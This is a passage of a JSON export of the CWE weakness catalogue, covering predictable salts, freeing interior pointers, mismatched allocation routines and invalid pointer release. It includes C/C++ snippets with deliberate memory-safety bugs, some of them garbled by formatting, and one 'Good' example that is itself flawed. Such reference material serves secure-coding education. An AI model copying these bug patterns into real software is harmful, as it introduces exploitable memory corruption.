      "ExtendedDescription": "\n\nThis makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables, effectively disabling the protection that an unpredictable salt would provide.\n\n\nIt should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "916",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "BackgroundDetails": [
        "In cryptography, salt refers to some random addition of data to an input before hashing to make dictionary attacks more difficult."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-51",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.\n\n\nSome hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.\n\n\nNote that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.\n",
          "Effectiveness": "High"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.",
          "Effectiveness": "Limited",
          "EffectivenessNotes": "Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-4905",
          "Description": "Blogging software uses a hard-coded salt when calculating a password hash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4905"
        },
        {
          "Reference": "CVE-2002-1657",
          "Description": "Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1657"
        },
        {
          "Reference": "CVE-2001-0967",
          "Description": "Server uses a constant salt when encrypting passwords, simplifying brute force attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0967"
        },
        {
          "Reference": "CVE-2005-0408",
          "Description": "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0408"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-291",
          "Authors": [
            "Johnny Shelley"
          ],
          "Title": "bcrypt",
          "URL": "http://bcrypt.sourceforge.net/"
        },
        {
          "ExternalReferenceID": "REF-292",
          "Authors": [
            "Colin Percival"
          ],
          "Title": "Tarsnap - The scrypt key derivation function and encryption utility",
          "URL": "http://www.tarsnap.com/scrypt.html"
        },
        {
          "ExternalReferenceID": "REF-293",
          "Section": "5.2 PBKDF2",
          "Authors": [
            "B. Kaliski"
          ],
          "Title": "RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0",
          "PublicationYear": "2000",
          "URL": "https://www.rfc-editor.org/rfc/rfc2898",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-294",
          "Authors": [
            "Coda Hale"
          ],
          "Title": "How To Safely Store A Password",
          "PublicationYear": "2010",
          "PublicationMonth": "01",
          "PublicationDay": "31",
          "URL": "https://codahale.com/how-to-safely-store-a-password/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-295",
          "Authors": [
            "Brian Krebs"
          ],
          "Title": "How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "11",
          "URL": "https://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-296",
          "Authors": [
            "Solar Designer"
          ],
          "Title": "Password security: past, present, future",
          "PublicationYear": "2012",
          "URL": "https://www.openwall.com/presentations/PHDays2012-Password-Security/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-297",
          "Authors": [
            "Troy Hunt"
          ],
          "Title": "Our password hashing has no clothes",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "26",
          "URL": "https://www.troyhunt.com/our-password-hashing-has-no-clothes/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-298",
          "Authors": [
            "Joshbw"
          ],
          "Title": "Should we really use bcrypt/scrypt?",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "08",
          "URL": "https://web.archive.org/web/20120629144851/http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-631",
          "Authors": [
            "OWASP"
          ],
          "Title": "Password Storage Cheat Sheet",
          "URL": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-632",
          "Authors": [
            "Thomas Ptacek"
          ],
          "Title": "Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes",
          "PublicationYear": "2007",
          "PublicationMonth": "09",
          "PublicationDay": "10",
          "URL": "http://hashphp.org/hashing.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-633",
          "Authors": [
            "Robert Graham"
          ],
          "Title": "The Importance of Being Canonical",
          "PublicationYear": "2009",
          "PublicationMonth": "02",
          "PublicationDay": "02",
          "URL": "https://blog.erratasec.com/2009/02/importance-of-being-canonical.html#.ZCbyY7LMJPY",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-634",
          "Authors": [
            "James McGlinn"
          ],
          "Title": "Password Hashing",
          "URL": "https://privacyaustralia.net/phpsec/articles/password-hashing/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-635",
          "Authors": [
            "Jeff Atwood"
          ],
          "Title": "Rainbow Hash Cracking",
          "PublicationYear": "2007",
          "PublicationMonth": "09",
          "PublicationDay": "08",
          "URL": "https://blog.codinghorror.com/rainbow-hash-cracking/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-636",
          "Authors": [
            "Jeff Atwood"
          ],
          "Title": "Speed Hashing",
          "PublicationYear": "2012",
          "PublicationMonth": "04",
          "PublicationDay": "06",
          "URL": "https://blog.codinghorror.com/speed-hashing/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-637",
          "Title": "Rainbow table",
          "PublicationYear": "2009",
          "PublicationMonth": "03",
          "PublicationDay": "03",
          "Publisher": "Wikipedia",
          "URL": "https://en.wikipedia.org/wiki/Rainbow_table",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 9, \"Creating a Salted Hash\" Page 302",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 2, \"Salt Values\", Page 46",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "As of CWE 4.5, terminology related to randomness, entropy, and predictability can vary widely. Within the developer and other communities, \"randomness\" is used heavily. However, within cryptography, \"entropy\" is distinct, typically implied as a measurement. There are no commonly-used definitions, even within standards documents and cryptography papers. Future versions of CWE will attempt to define these terms and, if necessary, distinguish between them in ways that are appropriate for different communities but do not reduce the usability of CWE for mapping, understanding, or other scenarios."
        }
      ]
    },
    {
      "ID": "761",
      "Name": "Free of Pointer not at Start of Buffer",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product calls free() on a pointer to a memory resource that was allocated on the heap, but the pointer is not at the start of the buffer.",
      "ExtendedDescription": "\n\nThis can cause the product to crash, or in some cases, modify critical program variables or execute code.\n\n\nThis weakness often occurs when the memory is allocated explicitly on the heap with one of the malloc() family functions and free() is called, but pointer arithmetic has caused the pointer to be in the interior or end of the buffer.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "763",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When utilizing pointer arithmetic to traverse a buffer, use a separate variable to track progress through memory and preserve the originally allocated address for later freeing."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory."
        },
        {
          "MitigationID": "MIT-4.6",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, glibc in Linux provides protection against free of invalid pointers.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a language that provides abstractions for memory allocation and deallocation."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a tool that dynamically detects memory management problems, such as valgrind."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-77",
          "Entries": [
            {
              "IntroText": "In this example, the programmer dynamically allocates a buffer to hold a string and then searches for a specific character. After completing the search, the programmer attempts to release the allocated memory and return SUCCESS or FAILURE to the caller. Note: for simplification, this example uses a hard-coded \"Search Me!\" string and a constant string length of 20."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define SUCCESS (1)\n\t#define FAILURE (0)\n\tint contains_char(char c){\n\t\t\tchar *str;\n\t\t\tstr = (char*)malloc(20*sizeof(char));\n\t\t\tstrcpy(str, \"Search Me!\");\n\t\t\twhile( *str != NULL){\n\t\t\t\t\tif( *str == c ){\n```\n/* matched char, free string and return success */* \n\t\t\t\t\t\t\tfree(str);\n\t\t\t\t\t\t\treturn SUCCESS;}\n\t\t\t\t\t\n\t\t\t\t\t */* didn't match yet, increment pointer and try next char */* \n\t\t\t\t\t\n\t\t\t\t\tstr = str + 1;}\n\t\t\t\n\t\t\t */* we did not match the char in the string, free mem and return failure */* \n\t\t\t\n\t\t\tfree(str);\n\t\t\treturn FAILURE;}"
            },
            {
              "BodyText": "However, if the character is not at the beginning of the string, or if it is not in the string at all, then the pointer will not be at the start of the buffer when the programmer frees it."
            },
            {
              "BodyText": "Instead of freeing the pointer in the middle of the buffer, the programmer can use an indexing pointer to step through the memory or abstract the memory calculations by using array indexing."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t#define SUCCESS (1)\n\t#define FAILURE (0)\n\tint cointains_char(char c){\n\t\t\tchar *str;\n\t\t\tint i = 0;\n\t\t\tstr = (char*)malloc(20*sizeof(char));\n\t\t\tstrcpy(str, \"Search Me!\");\n\t\t\twhile( i < strlen(str) ){\n\t\t\t\t\tif( str[i] == c ){\n```\n/* matched char, free string and return success */* \n\t\t\t\t\t\t\tfree(str);\n\t\t\t\t\t\t\treturn SUCCESS;}\n\t\t\t\t\t\n\t\t\t\t\t */* didn't match yet, increment pointer and try next char */* \n\t\t\t\t\t\n\t\t\t\t\ti = i + 1;}\n\t\t\t\n\t\t\t */* we did not match the char in the string, free mem and return failure */* \n\t\t\t\n\t\t\tfree(str);\n\t\t\treturn FAILURE;}"
            }
          ]
        },
        {
          "ID": "DX-78",
          "Entries": [
            {
              "IntroText": "This code attempts to tokenize a string and place it into an array using the strsep function, which inserts a \\0 byte in place of whitespace or a tab character. After finishing the loop, each string in the AP array points to a location within the input string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar **ap, *argv[10], *inputstring;\n\tfor (ap = argv; (*ap = strsep(&inputstring, \" \\t\")) != NULL;)\n\t\t\tif (**ap != '\\0')\n\t\t\t\tif (++ap >= &argv[10])\n\t\t\t\t\tbreak;\n\t/.../\n\tfree(ap[4]);\n```"
            },
            {
              "BodyText": "Since strsep is not allocating any new memory, freeing an element in the middle of the array is equivalent to free a pointer in the middle of inputstring."
            }
          ]
        },
        {
          "ID": "DX-79",
          "Entries": [
            {
              "IntroText": "Consider the following code in the context of a parsing application to extract commands out of user data. The intent is to parse each command and add it to a queue of commands to be executed, discarding each malformed entry."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n```\n//hardcode input length for simplicity* \n\tchar* input = (char*) malloc(40*sizeof(char));\n\tchar *tok;\n\tchar* sep = \" \\t\";\n\t\n\tget_user_input( input );\n\t\n\t\n\t */* The following loop will parse and process each token in the input string */* \n\t\n\ttok = strtok( input, sep);\n\twhile( NULL != tok ){\n\t```\n\t\t\tif( isMalformed( tok ) ){\n```\n/* ignore and discard bad data */* \n\t\t\t\t\tfree( tok );}\n\t\t\telse{\n\t\t\t```\n\t\t\t\tadd_to_command_queue( tok );\n\t\t\t}\n\t\t\ttok = strtok( NULL, sep));\n\t}\n```"
            },
            {
              "BodyText": "While the above code attempts to free memory associated with bad commands, since the memory was all allocated in one chunk, it must all be freed together."
            },
            {
              "BodyText": "One way to fix this problem would be to copy the commands into a new memory location before placing them in the queue. Then, after all commands have been processed, the memory can safely be freed."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n```\n//hardcode input length for simplicity* \n\tchar* input = (char*) malloc(40*sizeof(char));\n\tchar *tok, *command;\n\tchar* sep = \" \\t\";\n\t\n\tget_user_input( input );\n\t\n\t\n\t */* The following loop will parse and process each token in the input string */* \n\t\n\ttok = strtok( input, sep);\n\twhile( NULL != tok ){\n\t```\n\t\t\tif( !isMalformed( command ) ){\n```\n/* copy and enqueue good data */* \n\t\t\t\t\tcommand = (char*) malloc( (strlen(tok) + 1) * sizeof(char) );\n\t\t\t\t\tstrcpy( command, tok );\n\t\t\t\t\tadd_to_command_queue( command );}\n\t\t\ttok = strtok( NULL, sep));}\n\t\n\tfree( input )"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2019-11930",
          "Description": "function \"internally calls 'calloc' and returns a pointer at an index... inside the allocated buffer. This led to freeing invalid memory.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-11930"
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP12",
          "EntryName": "Faulty Memory Release"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-657",
          "Title": "boost C++ Library Smart Pointers",
          "URL": "https://www.boost.org/doc/libs/1_38_0/libs/smart_ptr/smart_ptr.htm",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-480",
          "Title": "Valgrind",
          "URL": "http://valgrind.org/"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "Currently, CWE-763 is the parent, however it may be desirable to have an intermediate parent which is not function-specific, similar to how CWE-762 is an intermediate parent between CWE-763 and CWE-590."
        }
      ]
    },
    {
      "ID": "762",
      "Name": "Mismatched Memory Management Routines",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product attempts to return a memory resource to the system, but it calls a release function that is not compatible with the function that was originally used to allocate that resource.",
      "ExtendedDescription": "\n\nThis weakness can be generally described as mismatching memory management routines, such as:\n\n\n  - The memory was allocated on the stack (automatically), but it was deallocated using the memory management routine free() (CWE-590), which is intended for explicitly allocated heap memory.\n\n  - The memory was allocated explicitly using one set of memory management functions, and deallocated using a different set. For example, memory might be allocated with malloc() in C++ instead of the new operator, and then deallocated with the delete operator.\n\nWhen the memory management functions are mismatched, the consequences may be as severe as code execution, memory corruption, or program crash. Consequences and ease of exploit will vary depending on the implementation of the routines and the object being managed.",
      "LikelihoodOfExploit": "Low",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "763",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Only call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free()."
        },
        {
          "MitigationID": "MIT-41",
          "Phase": [
            "Implementation"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nChoose a language or tool that provides automatic memory management, or makes manual memory management less error-prone.\n\n\nFor example, glibc in Linux provides protection against free of invalid pointers.\n\n\nWhen using Xcode to target OS X or iOS, enable automatic reference counting (ARC) [REF-391].\n\n\nTo help correctly and consistently manage memory when programming in C++, consider using a smart pointer class such as std::auto_ptr (defined by ISO/IEC ISO/IEC 14882:2003), std::shared_ptr and std::unique_ptr (specified by an upcoming revision of the C++ standard, informally referred to as C++ 1x), or equivalent solutions such as Boost.\n"
        },
        {
          "MitigationID": "MIT-4.6",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, glibc in Linux provides protection against free of invalid pointers.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a language that provides abstractions for memory allocation and deallocation."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a tool that dynamically detects memory management problems, such as valgrind."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-80",
          "Entries": [
            {
              "IntroText": "This example allocates a BarObj object using the new operator in C++, however, the programmer then deallocates the object using free(), which may lead to unexpected behavior."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tvoid foo(){\n\t\t\tBarObj *ptr = new BarObj()\n```\n/* do some work with ptr here */* \n\t\t\t\n\t\t\t...\n\t\t\t\n\t\t\tfree(ptr);}"
            },
            {
              "BodyText": "Instead, the programmer should have either created the object with one of the malloc family functions, or else deleted the object with the delete operator."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tvoid foo(){\n\t\t\tBarObj *ptr = new BarObj()\n```\n/* do some work with ptr here */* \n\t\t\t\n\t\t\t...\n\t\t\t\n\t\t\tdelete ptr;}"
            }
          ]
        },
        {
          "ID": "DX-85",
          "Entries": [
            {
              "IntroText": "In this example, the program does not use matching functions such as malloc/free, new/delete, and new[]/delete[] to allocate/deallocate the resource."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tclass A {\n\t\tvoid foo();\n\t};\n\tvoid A::foo(){\n\t\tint *ptr;\n\t\tptr = (int*)malloc(sizeof(int));\n\t\tdelete ptr;\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-86",
          "Entries": [
            {
              "IntroText": "In this example, the program calls the delete[] function on non-heap memory."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tclass A{\n\t\tvoid foo(bool);\n\t};\n\tvoid A::foo(bool heap) {\n\t\tint localArray[2] = {\n\t\t\t11,22\n\t\t};\n\t\tint *p = localArray;\n\t\tif (heap){\n\t\t\tp = new int[2];\n\t\t}\n\t\tdelete[] p;\n\t}\n```"
            }
          ]
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "WIN30-C",
          "EntryName": "Properly pair allocation and deallocation functions",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP12",
          "EntryName": "Faulty Memory Release"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-657",
          "Title": "boost C++ Library Smart Pointers",
          "URL": "https://www.boost.org/doc/libs/1_38_0/libs/smart_ptr/smart_ptr.htm",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-480",
          "Title": "Valgrind",
          "URL": "http://valgrind.org/"
        },
        {
          "ExternalReferenceID": "REF-391",
          "Authors": [
            "iOS Developer Library"
          ],
          "Title": "Transitioning to ARC Release Notes",
          "PublicationYear": "2013",
          "PublicationMonth": "08",
          "PublicationDay": "08",
          "URL": "https://developer.apple.com/library/archive/releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Applicable Platform",
          "Note": "\n\nThis weakness is possible in any programming language that allows manual management of memory.\n"
        }
      ]
    },
    {
      "ID": "763",
      "Name": "Release of Invalid Pointer or Reference",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product attempts to return a memory resource to the system, but it calls the wrong release function or calls the appropriate release function incorrectly.",
      "ExtendedDescription": "\n\nThis weakness can take several forms, such as:\n\n\n  - The memory was allocated, explicitly or implicitly, via one memory management method and deallocated using a different, non-compatible function (CWE-762).\n\n  - The function calls or memory management routines chosen are appropriate, however they are used incorrectly, such as in CWE-761.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "404",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Availability",
            "Confidentiality"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "This weakness may result in the corruption of memory, and perhaps instructions, possibly leading to a crash. If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Only call matching memory management functions. Do not mix and match routines. For example, when you allocate a buffer with malloc(), dispose of the original pointer with free()."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "When programming in C++, consider using smart pointers provided by the boost library to help correctly and consistently manage memory."
        },
        {
          "MitigationID": "MIT-4.6",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, glibc in Linux provides protection against free of invalid pointers.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use a language that provides abstractions for memory allocation and deallocation."
        },
        {
          "Phase": [
            "Testing"
          ],
          "Description": "Use a tool that dynamically detects memory management problems, such as valgrind."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-78",
          "Entries": [
            {
              "IntroText": "This code attempts to tokenize a string and place it into an array using the strsep function, which inserts a \\0 byte in place of whitespace or a tab character. After finishing the loop, each string in the AP array points to a location within the input string."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar **ap, *argv[10], *inputstring;\n\tfor (ap = argv; (*ap = strsep(&inputstring, \" \\t\")) != NULL;)\n\t\t\tif (**ap != '\\0')\n\t\t\t\tif (++ap >= &argv[10])\n\t\t\t\t\tbreak;\n\t/.../\n\tfree(ap[4]);\n```"
            },
            {
              "BodyText": "Since strsep is not allocating any new memory, freeing an element in the middle of the array is equivalent to free a pointer in the middle of inputstring."
            }
          ]
        },
        {
          "ID": "DX-80",
          "Entries": [
            {
              "IntroText": "This example allocates a BarObj object using the new operator in C++, however, the programmer then deallocates the object using free(), which may lead to unexpected behavior."
            },
            {
              "Nature": "Bad",
              "Language": "C++",
              "ExampleCode": "```\n\tvoid foo(){\n\t\t\tBarObj *ptr = new BarObj()\n```\n/* do some work with ptr here */* \n\t\t\t\n\t\t\t...\n\t\t\t\n\t\t\tfree(ptr);}"
            },
            {
              "BodyText": "Instead, the programmer should have either created the object with one of the malloc family functions, or else deleted the object with the delete operator."
            },
            {
              "Nature": "Good",
              "Language": "C++",
              "ExampleCode": "```\n\tvoid foo(){\n\t\t\tBarObj *ptr = new BarObj()\n```\n/* do some work with ptr here */* \n\t\t\t\n\t\t\t...\n\t\t\t\n\t\t\tdelete ptr;}"
            }
          ]
        },
        {
          "ID": "DX-77",
          "Entries": [
            {
              "IntroText": "In this example, the programmer dynamically allocates a buffer to hold a string and then searches for a specific character. After completing the search, the programmer attempts to release the allocated memory and return SUCCESS or FAILURE to the caller. Note: for simplification, this example uses a hard-coded \"Search Me!\" string and a constant string length of 20."
            },
            {
              "Nature": "Bad",
              "Language": "C",
